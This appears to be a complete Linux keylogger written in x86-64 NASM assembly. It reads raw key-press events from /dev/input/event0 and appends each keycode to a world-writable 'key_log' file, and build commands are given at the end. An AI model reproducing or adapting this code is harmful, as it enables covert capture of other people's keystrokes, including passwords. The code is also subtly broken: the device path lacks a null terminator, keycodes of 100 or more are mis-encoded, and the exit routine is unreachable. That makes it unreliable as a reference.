%define INPUT_EVENT_SIZE 24 ; in octets

section .data
    event0_file_path db "/dev/input/event0"
    key_log db "key_log", 0
    fd dq 0

section .bss
    key_temp resb 3
    buffer resb INPUT_EVENT_SIZE

section .text
    global _start

_start:
    mov rax, 2 ; open event0 file
    mov rdi, event0_file_path
    mov rsi, 0
    mov rdx, 0
    syscall
    mov [fd], rax ; save file descriptor of event0

reading_new_key:
    mov rax, 0 ; read INPUT_EVENT_SIZE (24 octets) in event0
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, INPUT_EVENT_SIZE
    syscall

    ; filter only “key pressed” events
    mov ax, [buffer + 16] ; type = ev_key
    cmp ax, 1
    jne reading_new_key
    mov eax, [buffer + 20]  ; value = press
    cmp eax, 1
    jne reading_new_key

    ; get the keycode
    movzx rax, word [buffer + 18] ; code
    mov rbx, 10
    xor rdx, rdx
    div rbx                         ; rax = quotient, rdx = reste
    add al, '0'                     ; quotient → ASCII
    add dl, '0'                     ; reste → ASCII
    mov [key_temp], al
    mov [key_temp+1], dl
    
    ; if we want to display the key uncomment
    ; mov rax, 1
    ; mov rdi, 1
    ; mov rsi, key_temp
    ; mov rdx, 3
    ; syscall

    jmp write_key_in_keylog

write_key_in_keylog:
    mov rax, 2 ; sys_open()
    mov rdi, key_log
    mov rsi, 2 | 64 | 1024 ; O_WRONLY | O_CREAT | O_APPEND
    mov rdx, 0777o        ; Permissions
    syscall
    mov rbx, rax ; save fd of keylog

    mov rax, 1 ; sys_write()
    mov rdi, rbx
    mov rsi, key_temp
    mov rdx, 3
    syscall

    mov rax, 3 ; sys_close()
    mov rdi, rbx
    syscall

    jmp reading_new_key

exit:
    mov rax, 3 ; close
    mov rdi, [fd]
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall

; nasm -f elf64 read_event.asm ; ld read_event.o -o read_event ; ./read_event